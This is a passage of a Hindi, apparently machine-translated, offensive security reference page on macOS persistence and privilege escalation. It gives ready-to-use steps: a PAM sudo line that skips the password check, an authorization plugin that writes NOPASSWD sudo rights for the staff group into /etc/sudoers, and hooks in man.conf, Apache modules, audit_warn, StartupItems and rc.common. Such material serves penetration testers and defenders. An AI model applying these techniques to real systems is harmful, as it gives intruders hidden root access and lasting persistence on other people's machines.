PAM अधिकतम रूप से **स्थायित्व** और मैलवेयर पर ध्यान केंद्रित होता है जो macOS में आसान निष्पादन पर। इस ब्लॉग में एक विस्तृत व्याख्या नहीं दी जाएगी, **इस तकनीक को बेहतर समझने के लिए व्राइटअप पढ़ें**।

PAM मॉड्यूल्स की जांच करें:&#x20;
```bash
ls -l /etc/pam.d
```
एक persistence/privilege escalation तकनीक PAM का दुरुपयोग करती है जो बहुत ही आसान है, बस /etc/pam.d/sudo मॉड्यूल को संशोधित करके पहले लाइन में निम्नलिखित लाइन जोड़नी होगी:
```bash
auth       sufficient     pam_permit.so
```
इसलिए यह **ऐसा दिखेगा**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
और इसलिए **`sudo` का उपयोग करने का प्रयास** कोई भी काम करेगा।

{% hint style="danger" %}
ध्यान दें कि यह निर्देशिका TCC द्वारा संरक्षित है, इसलिए उपयोगकर्ता को पहुंच के लिए पूछताछ करने के लिए प्रॉम्प्ट मिलने की अधिक संभावना है।
{% endhint %}

### अधिकृतता प्लगइन

लेख: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
लेख: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और अतिरिक्त कॉन्फ़िगरेशन करनी होगी

#### स्थान

* `/Library/Security/SecurityAgentPlugins/`
* रूट की आवश्यकता होती है
* अधिकृतता डेटाबेस को प्लगइन का उपयोग करने के लिए भी कॉन्फ़िगर करना आवश्यक है

#### विवरण और शोषण

आप एक अधिकृतता प्लगइन बना सकते हैं जो स्थिरता बनाए रखने के लिए उपयोगकर्ता लॉग-इन करते समय निष्पादित होगा। इन प्लगइन्स को कैसे बनाएं इसके बारे में अधिक जानकारी के लिए पिछले लेखों की जांच करें (और सावधान रहें, एक खराब तरीके से लिखा गया प्लगइन आपको बाहर बंद कर सकता है और आपको अपने मैक को रिकवरी मोड से साफ़ करने की आवश्यकता होगी)।
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**बंडल** को लोड होने वाले स्थान पर **मूव** करें:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
अंत में इस प्लगइन को लोड करने के लिए **नियम** जोड़ें:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** अधिकृति फ्रेमवर्क को सूचित करेगा कि उसे **अधिकृति के लिए एक बाहरी यंत्र को कॉल करने की आवश्यकता होगी**। इसके अलावा, **`privileged`** इसे रूट द्वारा निष्पादित करने के लिए करेगा।

इसे ट्रिगर करें:
```bash
security authorize com.asdf.asdf
```
और फिर **स्टाफ ग्रुप को sudo एक्सेस होना चाहिए** (पढ़ें `/etc/sudoers` को कन्फर्म करने के लिए)।

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और उपयोगकर्ता को man का उपयोग करना चाहिए

#### स्थान

* **`/private/etc/man.conf`**
* रूट की आवश्यकता होती है
* **`/private/etc/man.conf`**: हर बार man का उपयोग किया जाता है

#### विवरण और एक्सप्लॉइट

कॉन्फ़िग फ़ाइल **`/private/etc/man.conf`** मैन दस्तावेज़ीकरण फ़ाइलें खोलने के लिए उपयोग करने वाले बाइनरी/स्क्रिप्ट को दर्शाती है। इसलिए, निष्पादित होने पर एक्सेक्यूटेबल के पथ को संशोधित किया जा सकता है ताकि जब भी उपयोगकर्ता किसी डॉक्स को पढ़ने के लिए man का उपयोग करता है, एक बैकडोर निष्पादित होता है।

उदाहरण के लिए **`/private/etc/man.conf`** में सेट करें:
```
MANPAGER /tmp/view
```
और फिर `/tmp/view` को निम्नलिखित रूप में बनाएँ:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट यूज़र होना चाहिए और एपाचे चल रहा होना चाहिए

#### स्थान

* **`/etc/apache2/httpd.conf`**
* रूट यूज़र की आवश्यकता
* ट्रिगर: जब Apache2 शुरू होता है

#### विवरण और उत्पादन

आप /etc/apache2/httpd.conf में इंडिकेट कर सकते हैं कि एक मॉड्यूल लोड करने के लिए एक पंक्ति जोड़ें:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

इस तरह आपके कंपाइल किए गए मॉड्यूल Apache द्वारा लोड होंगे। एकमात्र बात यह है कि आपको इसे एक मान्य Apple प्रमाणपत्र के साथ साइन करने की आवश्यकता है, या आपको सिस्टम में एक नया विश्वसनीय प्रमाणपत्र जोड़ने की आवश्यकता है और उसे साइन करने की आवश्यकता है।

फिर, यदि आवश्यक हो, सर्वर को सुनिश्चित करने के लिए आप निम्नलिखित को निष्पादित कर सकते हैं:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
डाइलब के लिए कोड उदाहरण:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM ऑडिट फ्रेमवर्क

लेख: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए, ऑडिटडी चल रहा होना चाहिए और चेतावनी का कारण होना चाहिए

#### स्थान

* **`/etc/security/audit_warn`**
* रूट की आवश्यकता
* **ट्रिगर**: जब ऑडिटडी चेतावनी का पता लगाता है

#### विवरण और उत्पादन

जबकि ऑडिटडी चेतावनी का पता लगाता है, स्क्रिप्ट **`/etc/security/audit_warn`** **चलाया जाता है**। इसलिए आप इस पर अपने पेलोड जोड़ सकते हैं।
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
आप `sudo audit -n` के साथ एक चेतावनी लागू कर सकते हैं।

### स्टार्टअप आइटम्स

{% hint style="danger" %}
**यह पुराना हो गया है, इसलिए निम्नलिखित निर्देशिकाओं में कुछ नहीं मिलना चाहिए।**
{% endhint %}

एक **स्टार्टअप आइटम** एक **निर्देशिका** है जो इन दो फ़ोल्डरों में रखी जाती है। `/Library/StartupItems/` या `/System/Library/StartupItems/`

इन दो स्थानों में एक नई निर्देशिका रखने के बाद, उस निर्देशिका के अंदर **और दो आइटम** रखने की आवश्यकता होती है। ये दो आइटम एक **rc स्क्रिप्ट** और कुछ सेटिंग्स रखने वाली **plist** होती है। इस plist का नाम "StartupParameters.plist" होना चाहिए।

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="सुपरसेवानाम" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
मैं अपने macOS में इस कंपोनेंट को नहीं ढूंढ सकता हूँ, इसलिए अधिक जानकारी के लिए व्राइटअप देखें
{% endhint %}

व्राइटअप: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple ने एक लॉगिंग मेकेनिज़्म को **emond** के नाम से पेश किया। ऐसा लगता है कि इसे कभी पूरी तरह से विकसित नहीं किया गया था, और एप्पल ने अन्य मेकेनिज़्म के लिए इसके विकास को **छोड़ दिया** हो सकता है, लेकिन यह **उपलब्ध** है।

यह छोटी-जानी वाली सेवा एक Mac व्यवस्थापक के लिए **बहुत उपयोगी नहीं हो सकती है**, लेकिन एक धमकी प्रदाता के लिए एक बहुत अच्छा कारण होगा कि वह इसे एक **स्थायित्व मेकेनिज़्म के रूप में उपयोग** करें, जिसके बारे में शायद अधिकांश macOS व्यवस्थापक जानते ही नहीं होंगे। emond के दुष्प्रभावी उपयोग का पता लगाना कठिन नहीं होना चाहिए, क्योंकि सिस्टम लॉन्चडेमन सेवा केवल एक ही स्थान में चलाने के लिए स्क्रिप्ट खोजती है:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### स्थान

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* रूट की आवश्यकता
* **ट्रिगर**: XQuartz के साथ

#### विवरण और अभिकर्म

XQuartz **macOS में अब स्थापित नहीं है**, इसलिए अधिक जानकारी के लिए लेख की जांच करें।

### ~~kext~~

{% hint style="danger" %}
केवल रूट के रूप में kext स्थापित करना इतना कठिन है कि मैं इसे सैंडबॉक्स से बाहर निकलने या स्थिरता के लिए विचार नहीं करूंगा (जब तक आपके पास कोई अभिकर्म न हो)
{% endhint %}

#### स्थान

स्टार्टअप आइटम के रूप में एक KEXT स्थापित करने के लिए, इसे निम्नलिखित स्थानों में स्थापित किया जाना चाहिए:

* `/System/Library/Extensions`
* OS X ऑपरेटिंग सिस्टम में बिल्ट-इन KEXT फ़ाइलें।
* `/Library/Extensions`
* तृतीय-पक्ष सॉफ़्टवेयर द्वारा स्थापित किए गए KEXT फ़ाइलें

आप वर्तमान में लोड किए गए kext फ़ाइलों की सूची देख सकते हैं:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
अधिक जानकारी के लिए [**कर्नल एक्सटेंशन्स की जांच करने के लिए इस खंड की जांच करें**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers).

### ~~amstoold~~

लेख: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### स्थान

* **`/usr/local/bin/amstoold`**
* रूट अनिवार्य

#### विवरण और शोषण

जाहिर है कि `/System/Library/LaunchAgents/com.apple.amstoold.plist` से यह बाइनरी उपयोग कर रहा था जबकि एक XPC सेवा को उजागर कर रहा था... समस्या यह है कि बाइनरी मौजूद नहीं थी, इसलिए आप वहां कुछ रख सकते हैं और जब XPC सेवा को कॉल किया जाता है तो आपकी बाइनरी को कॉल किया जाएगा।

मुझे अब अपने macOS में यह नहीं मिल रहा है।

### ~~xsanctl~~

लेख: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### स्थान

* **`/Library/Preferences/Xsan/.xsanrc`**
* रूट अनिवार्य
* **ट्रिगर**: सेवा चलाई जाती है (शायद)

#### विवरण और शोषण

जाहिर है कि इस स्क्रिप्ट को चलाना अधिकांश बार आम नहीं है और मैं अपने macOS में इसे भी नहीं ढूंढ सका, इसलिए अधिक जानकारी के लिए लेख की जांच करें।

### ~~/etc/rc.common~~

{% hint style="danger" %}
**यह मॉडर्न MacOS संस्करणों में काम नहीं कर रहा है**
{% endhint %}

यहां **स्टार्टअप पर निष्पादित होने वाले कमांड** भी रखना संभव है। एक साधारण rc.common स्क्रिप्ट का उदाहरण:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को हैकट्रिक्स रेपो** (https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**

</details>
